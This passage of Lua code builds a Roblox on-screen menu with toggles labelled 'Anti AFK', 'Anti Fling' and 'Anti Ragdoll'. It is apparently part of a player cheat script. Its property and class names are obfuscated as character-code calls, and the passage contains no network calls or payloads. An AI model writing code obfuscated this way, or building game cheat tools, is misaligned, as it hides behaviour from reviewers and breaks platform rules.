_llza[_sc(49,48,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,48,100)][_sc(84,101,120,116)]=[[GUI Color:]];
_llza[_sc(49,48,100)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,48,100)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(49,48,100)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,48,101)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,48,100)]);
_llza[_sc(49,48,101)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 6);
_llza[_sc(49,48,102)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,48,100)]);
_llza[_sc(49,48,102)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,49,48)]=Instance.new(_sc(83,99,114,111,108,108,105,110,103,70,114,97,109,101),_llza[_sc(52,55)]);
_llza[_sc(49,49,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,49,48)][_sc(67,97,110,118,97,115,83,105,122,101)]=UDim2.new(0, 0, 1.5, 0);
_llza[_sc(49,49,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,49,48)][_sc(78,97,109,101)]=[[Main]];
_llza[_sc(49,49,48)][_sc(83,105,122,101)]=UDim2.new(0, 360, 0, 255);
_llza[_sc(49,49,48)][_sc(83,99,114,111,108,108,66,97,114,73,109,97,103,101,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,49,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,49,48)][_sc(83,99,114,111,108,108,66,97,114,84,104,105,99,107,110,101,115,115)]=0;
_llza[_sc(49,49,48)][_sc(65,99,116,105,118,101)]=true;
_llza[_sc(49,49,48)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,49,48)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.01351, 0, 0.01887, 0);
_llza[_sc(49,49,49)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,49,48)]);
_llza[_sc(49,49,49)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 255);
_llza[_sc(49,49,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,49,49)][_sc(78,97,109,101)]=[[rightside]];
_llza[_sc(49,49,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,49,49)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,49,49)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.51081, 0, 0, 0);
_llza[_sc(49,49,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,49,50)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(49,49,49)]);
_llza[_sc(49,49,50)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(49,49,50)][_sc(80,97,100,100,105,110,103)]=UDim.new(0, 5);
_llza[_sc(49,49,51)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,49,49)]);
_llza[_sc(49,49,51)][_sc(83,105,122,101)]=UDim2.new(0, 176, 0, 173);
_llza[_sc(49,49,51)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=1;
_llza[_sc(49,49,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,49,51)][_sc(78,97,109,101)]=[[antiTab]];
_llza[_sc(49,49,51)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,49,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(11, 11, 11);
_llza[_sc(49,49,52)]=Instance.new(_sc(76,111,99,97,108,83,99,114,105,112,116),_llza[_sc(49,49,51)]);
_llza[_sc(49,49,52)][_sc(78,97,109,101)]=_sc(97,110,116,105,83,99,114,105,112,116);
_llza[_sc(49,49,53)]=Instance.new(_sc(85,73,76,105,115,116,76,97,121,111,117,116),_llza[_sc(49,49,51)]);
_llza[_sc(49,49,53)][_sc(72,111,114,105,122,111,110,116,97,108,70,108,101,120)]=Enum.UIFlexAlignment.Fill;
_llza[_sc(49,49,53)][_sc(83,111,114,116,79,114,100,101,114)]=Enum.SortOrder.LayoutOrder;
_llza[_sc(49,49,54)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,49,51)]);
_llza[_sc(49,49,54)][_sc(67,111,108,111,114)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,49,54)][_sc(78,97,109,101)]=[[greystroke]];
_llza[_sc(49,49,54)][_sc(65,112,112,108,121,83,116,114,111,107,101,77,111,100,101)]=Enum.ApplyStrokeMode.Border;
_llza[_sc(49,49,54)][_sc(90,73,110,100,101,120)]=99;
_llza[_sc(49,49,55)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,49,51)]);
_llza[_sc(49,49,55)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 4);
_llza[_sc(49,49,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,49,55)][_sc(78,97,109,101)]=[[======ACCENT======]];
_llza[_sc(49,49,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,49,55)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,49,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,49,56)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,49,55)]);
_llza[_sc(49,49,56)][_sc(83,105,122,101)]=UDim2.new(1, -2, 0, 2);
_llza[_sc(49,49,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,49,56)][_sc(78,97,109,101)]=[[GuiColor]];
_llza[_sc(49,49,56)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,49,56)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 1, 0, 1);
_llza[_sc(49,49,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(0, 124, 255);
_llza[_sc(49,49,57)]=Instance.new(_sc(85,73,67,111,114,110,101,114),_llza[_sc(49,49,56)]);
_llza[_sc(49,49,97)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,49,51)]);
_llza[_sc(49,49,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(49,49,97)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(49,49,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,49,97)][_sc(78,97,109,101)]=[[afk]];
_llza[_sc(49,49,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,49,97)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,49,97)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(49,49,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,49,98)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,49,97)]);
_llza[_sc(49,49,98)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(49,49,98)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,49,98)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,49,98)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,49,98)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,49,98)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,49,98)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,49,98)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(49,49,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,49,98)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,49,98)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(49,49,99)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,49,98)]);
_llza[_sc(49,49,99)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(49,49,99)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(49,49,99)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,49,99)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,49,100)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,49,98)]);
_llza[_sc(49,49,100)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,49,100)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,49,100)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,49,100)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(49,49,100)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,49,101)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,49,100)]);
_llza[_sc(49,49,101)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,49,101)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,49,102)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,49,100)]);
_llza[_sc(49,49,102)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,49,102)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,49,102)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,49,102)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(49,49,102)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,49,102)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,50,48)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,49,102)]);
_llza[_sc(49,50,48)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,50,48)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,50,49)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,49,97)]);
_llza[_sc(49,50,49)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(49,50,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,50,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,50,49)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,50,49)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(49,50,49)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,50,49)][_sc(83,105,122,101)]=UDim2.new(0, 155, 0, 20);
_llza[_sc(49,50,49)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,50,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,50,49)][_sc(84,101,120,116)]=[[Anti AFK]];
_llza[_sc(49,50,49)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,50,49)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(49,50,49)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,50,49)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(49,50,50)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,50,49)]);
_llza[_sc(49,50,50)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(49,50,51)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,50,49)]);
_llza[_sc(49,50,51)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,50,52)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,49,97)]);
_llza[_sc(49,50,52)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(49,50,53)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,49,51)]);
_llza[_sc(49,50,53)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(49,50,53)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(49,50,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,50,53)][_sc(78,97,109,101)]=[[fling]];
_llza[_sc(49,50,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,50,53)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,50,53)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(49,50,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,50,54)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,50,53)]);
_llza[_sc(49,50,54)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(49,50,54)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,50,54)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,50,54)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,50,54)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,50,54)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,50,54)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,50,54)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(49,50,54)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,50,54)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,50,54)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(49,50,55)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,50,54)]);
_llza[_sc(49,50,55)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(49,50,55)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(49,50,55)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,50,55)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,50,56)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,50,54)]);
_llza[_sc(49,50,56)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,50,56)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,50,56)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,50,56)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(49,50,56)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,50,57)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,50,56)]);
_llza[_sc(49,50,57)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,50,57)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,50,97)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,50,56)]);
_llza[_sc(49,50,97)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,50,97)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,50,97)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,50,97)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(49,50,97)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,50,97)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,50,98)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,50,97)]);
_llza[_sc(49,50,98)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,50,98)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,50,99)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,50,53)]);
_llza[_sc(49,50,99)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(49,50,99)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,50,99)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,50,99)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,50,99)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(49,50,99)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,50,99)][_sc(83,105,122,101)]=UDim2.new(0, 155, 0, 20);
_llza[_sc(49,50,99)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,50,99)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,50,99)][_sc(84,101,120,116)]=[[Anti Fling]];
_llza[_sc(49,50,99)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,50,99)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(49,50,99)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,50,99)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(49,50,100)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,50,99)]);
_llza[_sc(49,50,100)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(49,50,101)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,50,99)]);
_llza[_sc(49,50,101)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,50,102)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,50,53)]);
_llza[_sc(49,50,102)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(49,51,48)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,49,51)]);
_llza[_sc(49,51,48)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(49,51,48)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=5;
_llza[_sc(49,51,48)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,51,48)][_sc(78,97,109,101)]=[[ragdoll]];
_llza[_sc(49,51,48)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,51,48)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,51,48)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0, 0, 0.02941, 0);
_llza[_sc(49,51,48)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,51,49)]=Instance.new(_sc(84,101,120,116,66,117,116,116,111,110),_llza[_sc(49,51,48)]);
_llza[_sc(49,51,49)][_sc(90,73,110,100,101,120)]=50;
_llza[_sc(49,51,49)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,51,49)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,51,49)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,51,49)][_sc(84,101,120,116,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,51,49)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,51,49)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,51,49)][_sc(83,105,122,101)]=UDim2.new(0, 20, 0, 20);
_llza[_sc(49,51,49)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,51,49)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,51,49)][_sc(78,97,109,101)]=[[button]];
_llza[_sc(49,51,50)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,51,49)]);
_llza[_sc(49,51,50)][_sc(80,97,100,100,105,110,103,84,111,112)]=UDim.new(0, 3);
_llza[_sc(49,51,50)][_sc(80,97,100,100,105,110,103,66,111,116,116,111,109)]=UDim.new(0, 3);
_llza[_sc(49,51,50)][_sc(80,97,100,100,105,110,103,82,105,103,104,116)]=UDim.new(0, 3);
_llza[_sc(49,51,50)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 3);
_llza[_sc(49,51,51)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,51,49)]);
_llza[_sc(49,51,51)][_sc(66,111,114,100,101,114,77,111,100,101)]=Enum.BorderMode.Inset;
_llza[_sc(49,51,51)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,51,51)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(51, 51, 51);
_llza[_sc(49,51,51)][_sc(78,97,109,101)]=[[toggleFrame]];
_llza[_sc(49,51,51)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(21, 21, 21);
_llza[_sc(49,51,52)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,51,51)]);
_llza[_sc(49,51,52)][_sc(84,104,105,99,107,110,101,115,115)]=2;
_llza[_sc(49,51,52)][_sc(78,97,109,101)]=[[outlineStroke]];
_llza[_sc(49,51,53)]=Instance.new(_sc(67,97,110,118,97,115,71,114,111,117,112),_llza[_sc(49,51,51)]);
_llza[_sc(49,51,53)][_sc(71,114,111,117,112,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,51,53)][_sc(83,105,122,101)]=UDim2.new(1, 0, 1, 0);
_llza[_sc(49,51,53)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,51,53)][_sc(78,97,109,101)]=[[toggleFade]];
_llza[_sc(49,51,53)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,51,53)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,51,54)]=Instance.new(_sc(85,73,71,114,97,100,105,101,110,116),_llza[_sc(49,51,53)]);
_llza[_sc(49,51,54)][_sc(84,114,97,110,115,112,97,114,101,110,99,121)]=NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1), NumberSequenceKeypoint.new(1.000, 0.7)};
_llza[_sc(49,51,54)][_sc(82,111,116,97,116,105,111,110)]=90;
_llza[_sc(49,51,55)]=Instance.new(_sc(84,101,120,116,76,97,98,101,108),_llza[_sc(49,51,48)]);
_llza[_sc(49,51,55)][_sc(84,101,120,116,87,114,97,112,112,101,100)]=true;
_llza[_sc(49,51,55)][_sc(66,111,114,100,101,114,83,105,122,101,80,105,120,101,108)]=0;
_llza[_sc(49,51,55)][_sc(66,97,99,107,103,114,111,117,110,100,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,51,55)][_sc(70,111,110,116,70,97,99,101)]=Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
_llza[_sc(49,51,55)][_sc(84,101,120,116,88,65,108,105,103,110,109,101,110,116)]=Enum.TextXAlignment.Left;
_llza[_sc(49,51,55)][_sc(84,101,120,116,83,105,122,101)]=14;
_llza[_sc(49,51,55)][_sc(83,105,122,101)]=UDim2.new(0, 155, 0, 20);
_llza[_sc(49,51,55)][_sc(84,101,120,116,67,111,108,111,114,51)]=Color3.fromRGB(255, 255, 255);
_llza[_sc(49,51,55)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
_llza[_sc(49,51,55)][_sc(84,101,120,116)]=[[Anti Ragdoll]];
_llza[_sc(49,51,55)][_sc(66,97,99,107,103,114,111,117,110,100,84,114,97,110,115,112,97,114,101,110,99,121)]=1;
_llza[_sc(49,51,55)][_sc(90,73,110,100,101,120)]=10;
_llza[_sc(49,51,55)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,51,55)][_sc(80,111,115,105,116,105,111,110)]=UDim2.new(0.10227, 0, 0, 0);
_llza[_sc(49,51,56)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,51,55)]);
_llza[_sc(49,51,56)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 5);
_llza[_sc(49,51,57)]=Instance.new(_sc(85,73,83,116,114,111,107,101),_llza[_sc(49,51,55)]);
_llza[_sc(49,51,57)][_sc(78,97,109,101)]=[[text]];
_llza[_sc(49,51,97)]=Instance.new(_sc(85,73,80,97,100,100,105,110,103),_llza[_sc(49,51,48)]);
_llza[_sc(49,51,97)][_sc(80,97,100,100,105,110,103,76,101,102,116)]=UDim.new(0, 2);
_llza[_sc(49,51,98)]=Instance.new(_sc(70,114,97,109,101),_llza[_sc(49,49,51)]);
_llza[_sc(49,51,98)][_sc(83,105,122,101)]=UDim2.new(1, 0, 0, 20);
_llza[_sc(49,51,98)][_sc(76,97,121,111,117,116,79,114,100,101,114)]=2;
_llza[_sc(49,51,98)][_sc(66,111,114,100,101,114,67,111,108,111,114,51)]=Color3.fromRGB(0, 0, 0);
